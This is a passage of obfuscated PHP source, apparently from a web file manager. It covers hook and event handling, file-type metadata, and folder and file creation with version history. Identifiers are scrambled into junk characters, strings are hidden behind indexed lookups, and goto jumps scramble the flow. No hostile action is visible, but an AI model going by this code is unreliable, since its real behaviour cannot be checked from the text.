$DÛÏÃÖÓ¸) { $fÚ‡»¡À•[] = str_replace($a©¢·¶¢ëö[0], $DÛÏÃÖÓ¸, $cÛ·÷ƒÛ‡¢); } } else { $fÚ‡»¡À•[] = $cÛ·÷ƒÛ‡¢; } } $e©´à¿ËÛ½[$F¼‘äòÖ¾ğ] = $fÚ‡»¡À•; } return $e©´à¿ËÛ½; } private static function valueResetAll($BíâãÜ…‘Ç, $f„Û¸¸Ìç¶) { goto cĞ¬’¿¸İ; d‘•ñíÓß¹: if ($dÊ‹íƒ²Ø) { $EîùÅ˜µŠ = IO_PATH_SYSTEM_TEMP . $Bíí²‚™ê½[1625] . KodIO::hashPath($f„Û¸¸Ìç¶) . $Bíí²‚™ê½[1626]; $BíâãÜ…‘Ç[$Bíí²‚™ê½[1627]] = Action($Bíí²‚™ê½[1628])->pluginCacheFileSet($EîùÅ˜µŠ, $dÊ‹íƒ²Ø); unset($BíâãÜ…‘Ç[$Bíí²‚™ê½[1629]][$Bíí²‚™ê½[1612]]); } $DãÇìÁÍë´ = _get($BíâãÜ…‘Ç, $Bíí²‚™ê½[1630], $Bíí²‚™ê½[33]); $FÖé©½¡® = _get($BíâãÜ…‘Ç, $Bíí²‚™ê½[1631], $Bíí²‚™ê½[33]); goto e’‘Â½¹§; c¿˜ß²ë‚…: return $BíâãÜ…‘Ç; goto Eù §ºğ; cĞ¬’¿¸İ: $Bíí²‚™ê½ =& $_SERVER[Æ]; if (isset($BíâãÜ…‘Ç[$Bíí²‚™ê½[1620]])) { $cŞ„´¹ÌÊ— = ceil($BíâãÜ…‘Ç[$Bíí²‚™ê½[1620]]); $b³˜ãİ†¸Ì = intval($cŞ„´¹ÌÊ— / 3600); $aÔŒùªÆ½ˆ = intval(($cŞ„´¹ÌÊ— - $b³˜ãİ†¸Ì * 3600) / 60); $cæ…š‡İ­â = $cŞ„´¹ÌÊ— % 60; $BíâãÜ…‘Ç[$Bíí²‚™ê½[1621]] = sprintf($Bíí²‚™ê½[1622], $b³˜ãİ†¸Ì, $aÔŒùªÆ½ˆ, $cæ…š‡İ­â); if ($b³˜ãİ†¸Ì == 0) { $BíâãÜ…‘Ç[$Bíí²‚™ê½[1621]] = sprintf($Bíí²‚™ê½[1623], $aÔŒùªÆ½ˆ, $cæ…š‡İ­â); } } $dÊ‹íƒ²Ø = _get($BíâãÜ…‘Ç, $Bíí²‚™ê½[1624]); goto d‘•ñíÓß¹; e’‘Â½¹§: $E¢¥ª­óõ¤ = _get($BíâãÜ…‘Ç, $Bíí²‚™ê½[1632], $Bíí²‚™ê½[33]); $e–øÜŒÆøÜ = $DãÇìÁÍë´ . $FÖé©½¡® . $E¢¥ª­óõ¤; if ($e–øÜŒÆøÜ && get_charset($e–øÜŒÆøÜ) != $Bíí²‚™ê½[326]) { $BíâãÜ…‘Ç[$Bíí²‚™ê½[1629]][$Bíí²‚™ê½[1340]] = iconv_to($BíâãÜ…‘Ç[$Bíí²‚™ê½[1629]][$Bíí²‚™ê½[1340]], get_charset($e–øÜŒÆøÜ), $Bíí²‚™ê½[326]); $BíâãÜ…‘Ç[$Bíí²‚™ê½[1629]][$Bíí²‚™ê½[1633]] = iconv_to($BíâãÜ…‘Ç[$Bíí²‚™ê½[1629]][$Bíí²‚™ê½[1633]], get_charset($e–øÜŒÆøÜ), $Bíí²‚™ê½[326]); $BíâãÜ…‘Ç[$Bíí²‚™ê½[1629]][$Bíí²‚™ê½[1634]] = iconv_to($BíâãÜ…‘Ç[$Bíí²‚™ê½[1629]][$Bíí²‚™ê½[1634]], get_charset($e–øÜŒÆøÜ), $Bíí²‚™ê½[326]); } goto c¿˜ß²ë‚…; Eù §ºğ: } private static function valueReset($E°—§ŒÎóˆ, $d×—Á”œ¦·, $DìŒÃÜ›¬ñ) { $F†Î·öÇ—” =& $_SERVER[Æ]; $C­ ¢¥±¬ª = $F†Î·öÇ—”[1550]; switch ($E°—§ŒÎóˆ) { case $F†Î·öÇ—”[1635]: $d×—Á”œ¦· = $d×—Á”œ¦· == $F†Î·öÇ—”[83] ? $F†Î·öÇ—”[1636] : $F†Î·öÇ—”[1637]; break; case $F†Î·öÇ—”[1638]: $d×—Á”œ¦· = $d×—Á”œ¦· ? $d×—Á”œ¦· : null; break; default: break; } switch ($DìŒÃÜ›¬ñ) { case $F†Î·öÇ—”[1639]: $d×—Á”œ¦· = round($d×—Á”œ¦·, 2); break; case $F†Î·öÇ—”[187]: case $F†Î·öÇ—”[107]: if ($d×—Á”œ¦· < 0) { $d×—Á”œ¦· = null; } else { if (is_numeric($d×—Á”œ¦·)) { $d×—Á”œ¦· = date($C­ ¢¥±¬ª, $d×—Á”œ¦·); } } break; default: break; } return $d×—Á”œ¦·; } private static function fileTypeArray() { $dõöˆ”¨Œ  =& $_SERVER[Æ]; return array($dõöˆ”¨Œ [1612] => array($dõöˆ”¨Œ [160] => $dõöˆ”¨Œ [1640] . $dõöˆ”¨Œ [1641], $dõöˆ”¨Œ [1616] => array($dõöˆ”¨Œ [1533] => $dõöˆ”¨Œ [1642], $dõöˆ”¨Œ [1535] => $dõöˆ”¨Œ [1643], $dõöˆ”¨Œ [1644] => $dõöˆ”¨Œ [1645], $dõöˆ”¨Œ [1646] => $dõöˆ”¨Œ [1647], $dõöˆ”¨Œ [187] => $dõöˆ”¨Œ [1648], $dõöˆ”¨Œ [107] => $dõöˆ”¨Œ [1649], $dõöˆ”¨Œ [1650] => $dõöˆ”¨Œ [1651], $dõöˆ”¨Œ [1652] => $dõöˆ”¨Œ [1653], $dõöˆ”¨Œ [1654] => $dõöˆ”¨Œ [1655], $dõöˆ”¨Œ [1656] => $dõöˆ”¨Œ [1657], $dõöˆ”¨Œ [1658] => $dõöˆ”¨Œ [1659], $dõöˆ”¨Œ [1660] => $dõöˆ”¨Œ [1661], $dõöˆ”¨Œ [1662] => $dõöˆ”¨Œ [1663], $dõöˆ”¨Œ [1664] => array($dõöˆ”¨Œ [1665] => $dõöˆ”¨Œ [1666], $dõöˆ”¨Œ [1667] => $dõöˆ”¨Œ [1668], $dõöˆ”¨Œ [1669] => $dõöˆ”¨Œ [1670]), $dõöˆ”¨Œ [1671] => $dõöˆ”¨Œ [1672], $dõöˆ”¨Œ [1673] => $dõöˆ”¨Œ [1674], $dõöˆ”¨Œ [1675] => $dõöˆ”¨Œ [1676], $dõöˆ”¨Œ [1677] => $dõöˆ”¨Œ [1678], $dõöˆ”¨Œ [1679] => array($dõöˆ”¨Œ [1680] => $dõöˆ”¨Œ [1681], $dõöˆ”¨Œ [1682] => $dõöˆ”¨Œ [1683], $dõöˆ”¨Œ [1684] => $dõöˆ”¨Œ [1685], $dõöˆ”¨Œ [1686] => $dõöˆ”¨Œ [1687], $dõöˆ”¨Œ [1688] => $dõöˆ”¨Œ [1689], $dõöˆ”¨Œ [1690] => $dõöˆ”¨Œ [1691], $dõöˆ”¨Œ [1692] => $dõöˆ”¨Œ [1693], $dõöˆ”¨Œ [1694] => $dõöˆ”¨Œ [1695], $dõöˆ”¨Œ [1696] => $dõöˆ”¨Œ [1697], $dõöˆ”¨Œ [1698] => $dõöˆ”¨Œ [1699], $dõöˆ”¨Œ [1700] => $dõöˆ”¨Œ [1701]))), $dõöˆ”¨Œ [1702] => array($dõöˆ”¨Œ [160] => $dõöˆ”¨Œ [1703] . $dõöˆ”¨Œ [1704], $dõöˆ”¨Œ [1616] => array($dõöˆ”¨Œ [1620] => $dõöˆ”¨Œ [1705], $dõöˆ”¨Œ [187] => $dõöˆ”¨Œ [1706], $dõöˆ”¨Œ [107] => $dõöˆ”¨Œ [1707], $dõöˆ”¨Œ [1652] => $dõöˆ”¨Œ [1708], $dõöˆ”¨Œ [1709] => $dõöˆ”¨Œ [1710], $dõöˆ”¨Œ [1711] => $dõöˆ”¨Œ [1638], $dõöˆ”¨Œ [1712] => $dõöˆ”¨Œ [1713], $dõöˆ”¨Œ [1714] => $dõöˆ”¨Œ [1715], $dõöˆ”¨Œ [1716] => $dõöˆ”¨Œ [1717], $dõöˆ”¨Œ [1629] => array($dõöˆ”¨Œ [1340] => $dõöˆ”¨Œ [1718], $dõöˆ”¨Œ [1633] => $dõöˆ”¨Œ [1719], $dõöˆ”¨Œ [1634] => $dõöˆ”¨Œ [1720], $dõöˆ”¨Œ [1721] => $dõöˆ”¨Œ [1722], $dõöˆ”¨Œ [1723] => $dõöˆ”¨Œ [1724], $dõöˆ”¨Œ [1725] => $dõöˆ”¨Œ [1726], $dõöˆ”¨Œ [1612] => $dõöˆ”¨Œ [1727]))), $dõöˆ”¨Œ [1728] => array($dõöˆ”¨Œ [160] => $dõöˆ”¨Œ [1729] . $dõöˆ”¨Œ [1730], $dõöˆ”¨Œ [1616] => array($dõöˆ”¨Œ [1533] => $dõöˆ”¨Œ [1731], $dõöˆ”¨Œ [1535] => $dõöˆ”¨Œ [1732], $dõöˆ”¨Œ [1620] => $dõöˆ”¨Œ [1705], $dõöˆ”¨Œ [187] => $dõöˆ”¨Œ [1733], $dõöˆ”¨Œ [107] => $dõöˆ”¨Œ [1734], $dõöˆ”¨Œ [1639] => $dõöˆ”¨Œ [1735], $dõöˆ”¨Œ [1716] => $dõöˆ”¨Œ [1736], $dõöˆ”¨Œ [1712] => $dõöˆ”¨Œ [1737], $dõöˆ”¨Œ [1652] => $dõöˆ”¨Œ [1738], $dõöˆ”¨Œ [1702] => array($dõöˆ”¨Œ [1711] => $dõöˆ”¨Œ [1638], $dõöˆ”¨Œ [1739] => $dõöˆ”¨Œ [1740], $dõöˆ”¨Œ [1709] => $dõöˆ”¨Œ [1710], $dõöˆ”¨Œ [1716] => $dõöˆ”¨Œ [1717], $dõöˆ”¨Œ [1712] => $dõöˆ”¨Œ [1741], $dõöˆ”¨Œ [1714] => $dõöˆ”¨Œ [1715]))), $dõöˆ”¨Œ [1742] => array($dõöˆ”¨Œ [1616] => array($dõöˆ”¨Œ [1743] => $dõöˆ”¨Œ [1744], $dõöˆ”¨Œ [1745] => $dõöˆ”¨Œ [1746])), $dõöˆ”¨Œ [1747] => array($dõöˆ”¨Œ [1616] => array())); } } class Hook { private static $events = array(); public static function get($Fõâ˜¸±Ö = false) { if (!$Fõâ˜¸±Ö) { return self::$events; } else { return self::$events[$Fõâ˜¸±Ö]; } } public static function apply($bº¾ëí¿ö, $C‹Ç ¼÷‹Ô = array()) { $eæ¾ÈÑŠêç = ActionApply($bº¾ëí¿ö, $C‹Ç ¼÷‹Ô); if (is_string($bº¾ëí¿ö)) { Hook::trigger($bº¾ëí¿ö); } return $eæ¾ÈÑŠêç; } public static function bind($b¦ïï—ê‘, $DÁœ×‰ˆƒ¾, $CĞÕò¨êíĞ = false) { $B„°ÂÊùŒƒ =& $_SERVER[Æ]; if (!isset(self::$events[$b¦ïï—ê‘])) { self::$events[$b¦ïï—ê‘] = array(); } self::$events[$b¦ïï—ê‘][] = array($B„°ÂÊùŒƒ[1748] => $DÁœ×‰ˆƒ¾, $B„°ÂÊùŒƒ[1749] => $CĞÕò¨êíĞ, $B„°ÂÊùŒƒ[1750] => 0); } public static function once($a¤»»ÀŠÓ¥, $bšƒ¦¶¤Æ„) { self::bind($a¤»»ÀŠÓ¥, $bšƒ¦¶¤Æ„, !0); } public static function unbind($aÚÀ’Â†›, $e“èÔã˜Ş§ = false) { if (!$e“èÔã˜Ş§) { self::$events[$aÚÀ’Â†›] = array(); return; } $dÈª£óÒé = self::$events[$aÚÀ’Â†›]; self::$events[$aÚÀ’Â†›] = array(); if (!is_array($dÈª£óÒé)) { return; } for ($dñ«‰Úº¨ = 0; $dñ«‰Úº¨ < count($dÈª£óÒé); $dñ«‰Úº¨++) { if ($dÈª£óÒé[$dñ«‰Úº¨][$_SERVER[Æ][1748]] == $e“èÔã˜Ş§) { continue; } self::$events[$aÚÀ’Â†›][] = $dÈª£óÒé[$dñ«‰Úº¨]; } } public static function filter($F‰äÛÚéöÍ, $A®ø’êÂÎ«) { goto C§™¾Ÿåôë; D½ŸÚØ­: for ($cŒ’‰åÑ¹ = 0; $cŒ’‰åÑ¹ < count($bî‰ÀÈ¢Ñ¬); $cŒ’‰åÑ¹++) { $BÍŞ„ã•ëÂ = $bî‰ÀÈ¢Ñ¬[$cŒ’‰åÑ¹]; if ($BÍŞ„ã•ëÂ[$B™ØÕ·Ó¶[1749]] && $BÍŞ„ã•ëÂ[$B™ØÕ·Ó¶[1750]] > 1) { continue; } self::$events[$F‰äÛÚéöÍ][$cŒ’‰åÑ¹][$B™ØÕ·Ó¶[1750]] = $BÍŞ„ã•ëÂ[$B™ØÕ·Ó¶[1750]] + 1; $a³ˆ†åô¾ = self::apply($BÍŞ„ã•ëÂ[$B™ØÕ·Ó¶[1748]], array($B„ø©±¡ñ¼)); if (gettype($a³ˆ†åô¾) == gettype($B„ø©±¡ñ¼)) { $B„ø©±¡ñ¼ = $a³ˆ†åô¾; } } return $B„ø©±¡ñ¼; goto d³ÑµéòÁ; AÑÑ‡±·òÑ: $bî‰ÀÈ¢Ñ¬ = $a¾ Ü’›†[$F‰äÛÚéöÍ]; $B„ø©±¡ñ¼ = $A®ø’êÂÎ«; if (!is_array($bî‰ÀÈ¢Ñ¬) || count($bî‰ÀÈ¢Ñ¬) == 0) { return $B„ø©±¡ñ¼; } goto D½ŸÚØ­; C§™¾Ÿåôë: $B™ØÕ·Ó¶ =& $_SERVER[Æ]; $a¾ Ü’›† = self::$events; if (!isset($a¾ Ü’›†[$F‰äÛÚéöÍ])) { return $A®ø’êÂÎ«; } goto AÑÑ‡±·òÑ; d³ÑµéòÁ: } public static function trigger($c–³è„¨Ì) { goto F•â†ãàµ; cï¥„ä·µ: $dÒ‰Ë¢à¬— = func_get_args(); array_shift($dÒ‰Ë¢à¬—); for ($FÊ˜ïÆ¦õá = 0; $FÊ˜ïÆ¦õá < count($f­‚îÄŒ‰); $FÊ˜ïÆ¦õá++) { $CèùßšË§ = $f­‚îÄŒ‰[$FÊ˜ïÆ¦õá]; if ($CèùßšË§[$D¸ƒ­Ç‡‘’[1749]] && $CèùßšË§[$D¸ƒ­Ç‡‘’[1750]] > 1) { continue; } if (defined($D¸ƒ­Ç‡‘’[1751]) && GLOBAL_LOG_HOOK) { write_log($c–³è„¨Ì . $D¸ƒ­Ç‡‘’[1752] . $CèùßšË§[$D¸ƒ­Ç‡‘’[1748]], $D¸ƒ­Ç‡‘’[1753]); } self::$events[$c–³è„¨Ì][$FÊ˜ïÆ¦õá][$D¸ƒ­Ç‡‘’[1750]] = $CèùßšË§[$D¸ƒ­Ç‡‘’[1750]] + 1; $FÈõ—´ãÂˆ = self::apply($CèùßšË§[$D¸ƒ­Ç‡‘’[1748]], $dÒ‰Ë¢à¬—); if (defined($D¸ƒ­Ç‡‘’[1751]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $D¸ƒ­Ç‡‘’[1753]); if ($CèùßšË§[$D¸ƒ­Ç‡‘’[1750]] == 200) { $CÉ¶”‚î›Ó = is_array($CèùßšË§[$D¸ƒ­Ç‡‘’[1748]]) ? json_encode_force($CèùßšË§[$D¸ƒ­Ç‡‘’[1748]]) : $CèùßšË§[$D¸ƒ­Ç‡‘’[1748]]; write_log($D¸ƒ­Ç‡‘’[1754] . $c–³è„¨Ì . $D¸ƒ­Ç‡‘’[1755] . $CÉ¶”‚î›Ó, $D¸ƒ­Ç‡‘’[1756]); } } $b§óŠ›…®‡ = is_null($FÈõ—´ãÂˆ) ? $b§óŠ›…®‡ : $FÈõ—´ãÂˆ; } goto a¿—˜™ß¢Š; E¢›¸Ü™ÇÊ: if (!isset($D·„œ›ô±ã[$c–³è„¨Ì])) { return $b§óŠ›…®‡; } $f­‚îÄŒ‰ = $D·„œ›ô±ã[$c–³è„¨Ì]; if (!is_array($f­‚îÄŒ‰) || count($f­‚îÄŒ‰) == 0) { return $b§óŠ›…®‡; } goto cï¥„ä·µ; F•â†ãàµ: $D¸ƒ­Ç‡‘’ =& $_SERVER[Æ]; $D·„œ›ô±ã = self::$events; $b§óŠ›…®‡ = !1; goto E¢›¸Ü™ÇÊ; a¿—˜™ß¢Š: return $b§óŠ›…®‡; goto CÕ¨¥š¾‰; CÕ¨¥š¾‰: } } goto f’É£ñ£; bÒ°ïºğâ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($FˆŠÖëáÜ) { $dæÅâÎ÷‘Á =& $_SERVER[Æ]; $Bó±Ü§°‰î = Model($dæÅâÎ÷‘Á[474])->where(array($dæÅâÎ÷‘Á[1425] => $FˆŠÖëáÜ))->find(); $a…Š¦º¬¢ = $this->_mkdirRoot(SourceModel::TYPE_USER, $FˆŠÖëáÜ, $Bó±Ü§°‰î[$dæÅâÎ÷‘Á[28]]); $this->userDesktopAdd($a…Š¦º¬¢); return $a…Š¦º¬¢; } public function userDesktopAdd($DÁÁ¨â¢ó´) { $e»âö‹™ŠÔ =& $_SERVER[Æ]; $aÇ§õÎê¹´ = LNG($e»âö‹™ŠÔ[2325]); $aÙä‰ì±ÀÜ = $this->mkdir($DÁÁ¨â¢ó´, $aÇ§õÎê¹´); $this->metaSet($aÙä‰ì±ÀÜ, $e»âö‹™ŠÔ[2326], $e»âö‹™ŠÔ[83]); $this->metaSet($DÁÁ¨â¢ó´, $e»âö‹™ŠÔ[2327], $aÙä‰ì±ÀÜ); } public function groupRootAdd($e…³Ùô÷«¢) { $F©ïîÀç‚ò =& $_SERVER[Æ]; $DÛáöÄŠ¾© = Model($F©ïîÀç‚ò[458])->where(array($F©ïîÀç‚ò[2173] => $e…³Ùô÷«¢))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $e…³Ùô÷«¢, $DÛáöÄŠ¾©[$F©ïîÀç‚ò[28]]); } public function systemRootPathAdd($BİÙÛÓ¯å) { if ($BİÙÛÓ¯å != $_SERVER[Æ][1089]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $BİÙÛÓ¯å); } public function userRootRemove($AÄÓµŠçŠ ) { $fßÖµ‘ÏĞÂ = $this->sourceRoot(SourceModel::TYPE_USER, $AÄÓµŠçŠ ); if (!$fßÖµ‘ÏĞÂ) { return; } $this->remove($fßÖµ‘ÏĞÂ, !1); } public function groupRootRemove($eò³œãá‘Ã) { $fè»³î×ºé = $this->sourceRoot(SourceModel::TYPE_GROUP, $eò³œãá‘Ã); if (!$fè»³î×ºé) { return; } $this->remove($fè»³î×ºé, !1); } private function _mkdirRoot($FöÓ±èÅÔğ, $dõÃ·³ô„¶, $b½¦äƒ‘Ü) { goto a‚ëî“ª; e¯ç“Ü˜’ç: $DÚ÷ù…„ÃÃ = "\115\x6f\x64\145\x6c\123\x6f\165\x72\143\x65\x2e\155\153\144\x69\162\122\157\x6f\164\56{$FöÓ±èÅÔğ}\56{$dõÃ·³ô„¶}\x2e" . $b½¦äƒ‘Ü; CacheLock::lock($DÚ÷ù…„ÃÃ); $aˆ‹‚ä‰Ê–[$AÖÀé…¢Ì[28]] = $b½¦äƒ‘Ü; goto dß“°–é·™; dß“°–é·™: $ağ¨ôÊ§È = $this->add($aˆ‹‚ä‰Ê–); $b‹ÙâÙ¤¨Ò = array($AÖÀé…¢Ì[527] => short_id($ağ¨ôÊ§È)); $this->where(array($AÖÀé…¢Ì[383] => $ağ¨ôÊ§È))->save($b‹ÙâÙ¤¨Ò); goto aÉ¦…îË±à; a‚ëî“ª: $AÖÀé…¢Ì =& $_SERVER[Æ]; $aˆ‹‚ä‰Ê– = array($AÖÀé…¢Ì[368] => 0, $AÖÀé…¢Ì[521] => $FöÓ±èÅÔğ, $AÖÀé…¢Ì[522] => $dõÃ·³ô„¶, $AÖÀé…¢Ì[518] => 1, $AÖÀé…¢Ì[523] => USER_ID, $AÖÀé…¢Ì[524] => USER_ID, $AÖÀé…¢Ì[519] => $AÖÀé…¢Ì[33], $AÖÀé…¢Ì[525] => $AÖÀé…¢Ì[470], $AÖÀé…¢Ì[396] => 0, $AÖÀé…¢Ì[520] => 0, $AÖÀé…¢Ì[420] => 0, $AÖÀé…¢Ì[526] => $AÖÀé…¢Ì[33]); if ($B¬Ûªñ’øğ = $this->where($aˆ‹‚ä‰Ê–)->find()) { return $B¬Ûªñ’øğ[$AÖÀé…¢Ì[369]]; } goto e¯ç“Ü˜’ç; aÉ¦…îË±à: CacheLock::unlock($DÚ÷ù…„ÃÃ); return $ağ¨ôÊ§È; goto D‚®¤ïÜ½ä; D‚®¤ïÜ½ä: } private function sourceRoot($D¢Ù£Ï‘‡¸, $Eñ‚Æé°óµ, $bÄÜ”–ˆ„ = false) { $E½Î‹ÇˆÁˆ =& $_SERVER[Æ]; $B»×ÁÜ³å¶ = array($E½Î‹ÇˆÁˆ[368] => 0, $E½Î‹ÇˆÁˆ[521] => $D¢Ù£Ï‘‡¸, $E½Î‹ÇˆÁˆ[522] => $Eñ‚Æé°óµ); if ($cÑ¬İ÷çÖË = $this->where($B»×ÁÜ³å¶)->find()) { return $bÄÜ”–ˆ„ ? $cÑ¬İ÷çÖË : $cÑ¬İ÷çÖË[$E½Î‹ÇˆÁˆ[369]]; } return !1; } public function sourceRootGroup($E£¥ê¹Ş›) { $FÌë“ôò× =& $_SERVER[Æ]; if (is_string($E£¥ê¹Ş›)) { $E£¥ê¹Ş› = array($E£¥ê¹Ş›); } $AÒ½’Šáö† = array($FÌë“ôò×[368] => 0, $FÌë“ôò×[521] => SourceModel::TYPE_GROUP, $FÌë“ôò×[522] => array($FÌë“ôò×[7], $E£¥ê¹Ş›)); $F“§£˜½Äè = $this->listSource($AÒ½’Šáö†, 1000); return array_to_keyvalue($F“§£˜½Äè[$FÌë“ôò×[74]], $FÌë“ôò×[456]); } public function mkfile($eÈëë•ÂÛˆ, $B¨·†É®´, $c©Š•§¥¡ = '', $a»‚¶ˆ›á¸ = REPEAT_RENAME) { $F’é¾®­æ =& $_SERVER[Æ]; $f·ŒÃ£‚ = Model($F’é¾®­æ[544])->addFileByContent($c©Š•§¥¡, $B¨·†É®´); return $this->_createFileCall($eÈëë•ÂÛˆ, $B¨·†É®´, $f·ŒÃ£‚, $a»‚¶ˆ›á¸, $F’é¾®­æ[1125]); } public function addFile($b½ó¢›Î, $FˆŒ‘Êİ•×, $dã×Ìá«˜ , $aœÂõ¤èÒ = false, $F¸«âÚ’ïŸ = REPEAT_RENAME) { $B·®ã­İš = Model($_SERVER[Æ][544])->addFile($FˆŒ‘Êİ•×, $dã×Ìá«˜ , $aœÂõ¤èÒ); return $this->_createFileCall($b½ó¢›Î, $dã×Ìá«˜ , $B·®ã­İš, $F¸«âÚ’ïŸ); } public function addFileByFileID($eğšË¬„ê‚, $fÒ®ãÄÓÎ, $C®†ææ‚‰, $eå¦½Ãê¶‹ = REPEAT_RENAME) { $c¾ê÷ç×àŠ =& $_SERVER[Æ]; $FÌ”ÙÚŒÜ = Model($c¾ê÷ç×àŠ[544])->find($fÒ®ãÄÓÎ); Model($c¾ê÷ç×àŠ[544])->linkAdd($fÒ®ãÄÓÎ); return $this->_createFileCall($eğšË¬„ê‚, $C®†ææ‚‰, $FÌ”ÙÚŒÜ, $eå¦½Ãê¶‹); } public function addFileByRemote($còÖ”’”¢Ò, $dÍã’Îã˜ë, $aèÀ¨Î±ğ, $C—œ‚ùÙõ = array(), $DõöóŞË±’ = REPEAT_RENAME) { $Fˆõãç‰Œ­ = Model($_SERVER[Æ][544])->addFileByRemote($dÍã’Îã˜ë, $aèÀ¨Î±ğ, $C—œ‚ùÙõ); return $this->_createFileCall($còÖ”’”¢Ò, $aèÀ¨Î±ğ, $Fˆõãç‰Œ­, $DõöóŞË±’); } private function _createFileCall($Cªä±õ, $b’Š¸­ËƒÑ, $b“ùñ“Û Ø, $C†˜¦óƒù½, $f“àÂš™ß = "\165\x70\154\157\x61\x64") { goto E½æ‰ÌÛçº; E½æ‰ÌÛçº: $eÇ“Ò¯òŞ¤ =& $_SERVER[Æ]; $aáÕö¹œ½• = !1; $this->lockWriteStart($Cªä±õ, $b’Š¸­ËƒÑ); goto EµëÆë±‚°; EµëÆë±‚°: $fé–ğÌŞ = $this->_createFile($Cªä±õ, $b’Š¸­ËƒÑ, $b“ùñ“Û Ø, $C†˜¦óƒù½, $aáÕö¹œ½•); if (!$aáÕö¹œ½•) { Model($eÇ“Ò¯òŞ¤[422])->remove($b“ùñ“Û Ø[$eÇ“Ò¯òŞ¤[419]]); } else { if ($fé–ğÌŞ) { Model($eÇ“Ò¯òŞ¤[2298])->eventCreate($fé–ğÌŞ, $f“àÂš™ß); } } $this->lockWriteEnd($Cªä±õ, $b’Š¸­ËƒÑ); goto C¼ğ©æ; C¼ğ©æ: return $fé–ğÌŞ; goto FŸëñ™ÔŠÜ; FŸëñ™ÔŠÜ: } public function mkdir($Cˆ¿ÔĞî¹–, $b ß·™˜êÌ, $Aˆ÷ÏÛ¹Î = REPEAT_SKIP) { goto bÄøŠ†¶ğ›; E¥ÉÁŠŠ„æ: $this->lockWriteStart($Cˆ¿ÔĞî¹–, $b ß·™˜êÌ); if ($Aˆ÷ÏÛ¹Î !== !1) { $B†çì†œôÔ = $this->fileNameExist($Cˆ¿ÔĞî¹–, $b ß·™˜êÌ); if ($B†çì†œôÔ && $Aˆ÷ÏÛ¹Î != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Cˆ¿ÔĞî¹–, $b ß·™˜êÌ); return $B†çì†œôÔ; } $b ß·™˜êÌ = $this->fileNameAuto($Cˆ¿ÔĞî¹–, $b ß·™˜êÌ, $Aˆ÷ÏÛ¹Î); } $f˜ßÍŞ® = array($F¡ˆç·Ñ¡¥[518] => 1, $F¡ˆç·Ñ¡¥[386] => $b ß·™˜êÌ, $F¡ˆç·Ñ¡¥[519] => $F¡ˆç·Ñ¡¥[33], $F¡ˆç·Ñ¡¥[420] => 0, $F¡ˆç·Ñ¡¥[520] => 0); goto e‰Éõªçêô; bÄøŠ†¶ğ›: $F¡ˆç·Ñ¡¥ =& $_SERVER[Æ]; $c•·í¡Ä›Ü = $this->sourceInfo($Cˆ¿ÔĞî¹–); if (!$c•·í¡Ä›Ü) { return !1; } goto E¥ÉÁŠŠ„æ; e‰Éõªçêô: $aïÏó©ÏáŒ = $this->_addSoure($f˜ßÍŞ®, $c•·í¡Ä›Ü); Model($F¡ˆç·Ñ¡¥[2298])->eventCreate($aïÏó©ÏáŒ, $F¡ˆç·Ñ¡¥[1126]); $this->lockWriteEnd($Cˆ¿ÔĞî¹–, $b ß·™˜êÌ); goto EŒ¥ÛŞÈ”…; EŒ¥ÛŞÈ”…: return $aïÏó©ÏáŒ; goto b¼•â¢›ĞÀ; b¼•â¢›ĞÀ: } private function _createFile($fÎ¹¨‹–¿, $a–èÌ¢ó¸, $bÆñØ‰, $f´ƒ„Ÿâ¿ä, &$DŒõæ¿í–¢) { goto E²Îó­Ô‘; eà£Îİ„: if ($f´ƒ„Ÿâ¿ä !== !1) { $bÅ¸´ß¿‡á = $this->fileNameExist($fÎ¹¨‹–¿, $a–èÌ¢ó¸); } $DŒõæ¿í–¢ = !0; if ($f´ƒ„Ÿâ¿ä && $bÅ¸´ß¿‡á) { if ($f´ƒ„Ÿâ¿ä == REPEAT_SKIP) { $DŒõæ¿í–¢ = !1; return $bÅ¸´ß¿‡á; } else { if ($f´ƒ„Ÿâ¿ä == REPEAT_REPLACE) { $CÜ©ŠøÏÈß = $this->sourceInfo($bÅ¸´ß¿‡á); $cĞ–‚¨Ö§ = $this->fileHistory($CÜ©ŠøÏÈß, $bÆñØ‰[$döÑùæõò[419]], $bÆñØ‰[$döÑùæõò[77]]); if (!$cĞ–‚¨Ö§) { $DŒõæ¿í–¢ = !1; } else { $this->folderSizeReset($fÎ¹¨‹–¿); } return $bÅ¸´ß¿‡á; } else { $a–èÌ¢ó¸ = $this->fileNameAuto($fÎ¹¨‹–¿, $a–èÌ¢ó¸, $f´ƒ„Ÿâ¿ä, !1); } } } goto C¨´ó×À‘¸; C¨´ó×À‘¸: $cÓŠâ¥à— = array($döÑùæõò[518] => 0, $döÑùæõò[386] => $a–èÌ¢ó¸, $döÑùæõò[519] => get_path_ext($a–èÌ¢ó¸), $döÑùæõò[420] => $bÆñØ‰[$döÑùæõò[419]], $döÑùæõò[520] => $bÆñØ‰[$döÑùæõò[77]]); $aÉ¡šÑòàö = $this->_addSoure($cÓŠâ¥à—, $c§£Š‹ˆšƒ); $this->folderSizeReset($fÎ¹¨‹–¿); goto C†òíƒ©¶; E²Îó­Ô‘: $döÑùæõò =& $_SERVER[Æ]; $c§£Š‹ˆšƒ = $this->sourceInfo($fÎ¹¨‹–¿); if (!$bÆñØ‰ || !$c§£Š‹ˆšƒ) { return !1; } goto eà£Îİ„; C†òíƒ©¶: return $aÉ¡šÑòàö; goto AÅãŸç‰‡; AÅãŸç‰‡: } protected function fileHistory($cö³Á¦ÑÑ±, $D÷×Ûë„µ, $f¹ÇÄîÄ‰‡) { goto bŠé›ÜƒÂÏ; CÉÑäóŸ‹¡: return !0; goto b¨ÖºÅœ­; DÛ­²Ç£¡: Model($F¤Åøç¯ª°[2328])->addHistory($cö³Á¦ÑÑ±); $fÁô ·£¡ = array($F¤Åøç¯ª°[524] => USER_ID, $F¤Åøç¯ª°[390] => time(), $F¤Åøç¯ª°[419] => $D÷×Ûë„µ, $F¤Åøç¯ª°[77] => $f¹ÇÄîÄ‰‡); $this->where(array($F¤Åøç¯ª°[383] => $cö³Á¦ÑÑ±[$F¤Åøç¯ª°[369]]))->save($fÁô ·£¡); goto CÉÑäóŸ‹¡; bŠé›ÜƒÂÏ: $F¤Åøç¯ª° =& $_SERVER[Æ]; if ($cö³Á¦ÑÑ±[$F¤Åøç¯ª°[419]] == $D÷×Ûë„µ) { return !1; } 